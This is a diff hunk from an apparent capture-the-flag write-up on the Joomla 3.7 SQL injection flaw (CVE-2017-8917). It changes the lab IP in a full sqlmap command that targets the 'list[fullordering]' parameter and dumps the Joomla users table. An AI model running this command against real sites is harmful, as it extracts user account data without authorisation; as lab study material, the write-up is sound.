@@ -41,7 +41,7 @@ From looking [brainwrf](https://github.com/brianwrf/Joomla3.7-SQLi-CVE-2017-8917
 Scripting Python day is somewhat long over due. I have done lots of l33tcode questions,  but for some reason the request library and solving problems by requesting stuff has yet, but soon stick..
 
 ```bash
-sqlmap -u "http://10.10.137.208/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
+sqlmap -u "http://10.10.94.98/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
 ```
 
 ![](johan.png)
